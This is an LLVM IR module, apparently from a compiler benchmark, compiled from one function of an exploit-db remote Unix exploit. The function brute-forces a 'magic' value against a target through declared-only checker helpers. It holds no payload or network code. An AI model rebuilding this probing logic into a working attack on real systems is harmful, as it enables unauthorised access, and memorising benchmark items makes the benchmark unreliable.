; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20030.c_magic_digger.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20030.c_magic_digger.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_FAILED = common dso_local global i32 0, align 4
@magic_str = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@errno = common dso_local global i32 0, align 4
@MAX_MAGIC = common dso_local global i32 0, align 4
@magic = common dso_local global i32* null, align 8
@magic_d = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%.f\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%c\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @magic_digger(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %10 = load i32, i32* @MAX_FAILED, align 4
  %11 = mul nsw i32 %10, 2
  store i32 %11, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %12 = load i8*, i8** @magic_str, align 8
  %13 = icmp eq i8* %12, null
  br i1 %13, label %14, label %23

14:                                               ; preds = %1
  %15 = call i64 @malloc(i32 4092)
  %16 = inttoptr i64 %15 to i8*
  store i8* %16, i8** @magic_str, align 8
  %17 = icmp eq i8* %16, null
  br i1 %17, label %18, label %22

18:                                               ; preds = %14
  %19 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* @errno, align 4
  %21 = call i32 @exit(i32 %20) #3
  unreachable

22:                                               ; preds = %14
  br label %23

23:                                               ; preds = %22, %1
  %24 = load i8*, i8** @magic_str, align 8
  %25 = call i32 @bzero(i8* %24, i32 4092)
  store i32 0, i32* %5, align 4
  br label %26

26:                                               ; preds = %169, %159, %23
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %29, label %170

29:                                               ; preds = %26
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* @MAX_MAGIC, align 4
  %32 = sub nsw i32 %31, 1
  %33 = icmp sge i32 %30, %32
  br i1 %33, label %37, label %34

34:                                               ; preds = %29
  %35 = load i32, i32* %6, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34, %29
  store i32 -1, i32* %2, align 4
  br label %171

38:                                               ; preds = %34
  %39 = load i32, i32* %3, align 4
  %40 = load i8*, i8** @magic_str, align 8
  %41 = call i64 @magic_check_f(i32 %39, i8* %40)
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %86

43:                                               ; preds = %38
  store i32 0, i32* %8, align 4
  %44 = load i32, i32* %7, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %7, align 4
  %46 = load i32, i32* %7, align 4
  %47 = icmp eq i32 %46, 1
  br i1 %47, label %48, label %73

48:                                               ; preds = %43
  %49 = load i32*, i32** @magic, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %60, label %55

55:                                               ; preds = %48
  %56 = load i32*, i32** @magic, align 8
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i32, i32* %56, i64 %58
  store i32 1, i32* %59, align 4
  br label %68

60:                                               ; preds = %48
  %61 = load i32*, i32** @magic, align 8
  %62 = load i32, i32* %5, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %61, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %65, align 4
  br label %68

68:                                               ; preds = %60, %55
  %69 = load i32*, i32** @magic_d, align 8
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i32, i32* %69, i64 %71
  store i32 1, i32* %72, align 4
  br label %80

73:                                               ; preds = %43
  %74 = load i32*, i32** @magic, align 8
  %75 = load i32, i32* %5, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i32, i32* %74, i64 %76
  %78 = load i32, i32* %77, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %77, align 4
  br label %80

80:                                               ; preds = %73, %68
  %81 = load i32, i32* @MAX_FAILED, align 4
  %82 = mul nsw i32 %81, 2
  store i32 %82, i32* %6, align 4
  %83 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  %84 = load i32, i32* @stdout, align 4
  %85 = call i32 @fflush(i32 %84)
  br label %162

86:                                               ; preds = %38
  %87 = load i32, i32* %6, align 4
  %88 = add nsw i32 %87, -1
  store i32 %88, i32* %6, align 4
  %89 = load i32, i32* %3, align 4
  %90 = load i8*, i8** @magic_str, align 8
  %91 = call i32 @magic_check_o(i32 %89, i8* %90)
  store i32 %91, i32* %9, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %159

93:                                               ; preds = %86
  store i32 0, i32* %7, align 4
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %8, align 4
  %97 = icmp eq i32 %96, 1
  br i1 %97, label %98, label %122

98:                                               ; preds = %93
  %99 = load i32*, i32** @magic, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  %103 = load i32, i32* %102, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %108, label %105

105:                                              ; preds = %98
  %106 = load i32*, i32** @magic, align 8
  %107 = getelementptr inbounds i32, i32* %106, i64 0
  store i32 1, i32* %107, align 4
  br label %116

108:                                              ; preds = %98
  %109 = load i32*, i32** @magic, align 8
  %110 = load i32, i32* %5, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i32, i32* %109, i64 %112
  %114 = load i32, i32* %113, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %113, align 4
  br label %116

116:                                              ; preds = %108, %105
  %117 = load i32, i32* %9, align 4
  %118 = load i32*, i32** @magic_d, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  store i32 %117, i32* %121, align 4
  br label %149

122:                                              ; preds = %93
  %123 = load i32*, i32** @magic_d, align 8
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32, i32* %9, align 4
  %129 = icmp eq i32 %127, %128
  br i1 %129, label %130, label %137

130:                                              ; preds = %122
  %131 = load i32*, i32** @magic, align 8
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i32, i32* %131, i64 %133
  %135 = load i32, i32* %134, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %134, align 4
  br label %148

137:                                              ; preds = %122
  %138 = load i32*, i32** @magic, align 8
  %139 = load i32, i32* %5, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i32, i32* %138, i64 %141
  store i32 1, i32* %142, align 4
  %143 = load i32, i32* %9, align 4
  %144 = load i32*, i32** @magic_d, align 8
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i32, i32* %144, i64 %146
  store i32 %143, i32* %147, align 4
  br label %148

148:                                              ; preds = %137, %130
  br label %149

149:                                              ; preds = %148, %116
  %150 = load i32, i32* @MAX_FAILED, align 4
  %151 = mul nsw i32 %150, 2
  store i32 %151, i32* %6, align 4
  %152 = load i32, i32* %9, align 4
  %153 = icmp eq i32 %152, 2
  %154 = zext i1 %153 to i64
  %155 = select i1 %153, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0)
  %156 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8* %155)
  %157 = load i32, i32* @stdout, align 4
  %158 = call i32 @fflush(i32 %157)
  br label %162

159:                                              ; preds = %86
  %160 = load i32, i32* %6, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %6, align 4
  br label %26

162:                                              ; preds = %149, %80
  %163 = load i32, i32* %3, align 4
  %164 = load i8*, i8** @magic_str, align 8
  %165 = call i64 @magic_check_ok(i32 %163, i8* %164)
  %166 = icmp ne i64 %165, 0
  br i1 %166, label %167, label %169

167:                                              ; preds = %162
  %168 = call i32 @putchar(i8 signext 10)
  store i32 0, i32* %2, align 4
  br label %171

169:                                              ; preds = %162
  br label %26

170:                                              ; preds = %26
  store i32 0, i32* %2, align 4
  br label %171

171:                                              ; preds = %170, %167, %37
  %172 = load i32, i32* %2, align 4
  ret i32 %172
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i64 @magic_check_f(i32, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @magic_check_o(i32, i8*) #1

declare dso_local i64 @magic_check_ok(i32, i8*) #1

declare dso_local i32 @putchar(i8 signext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
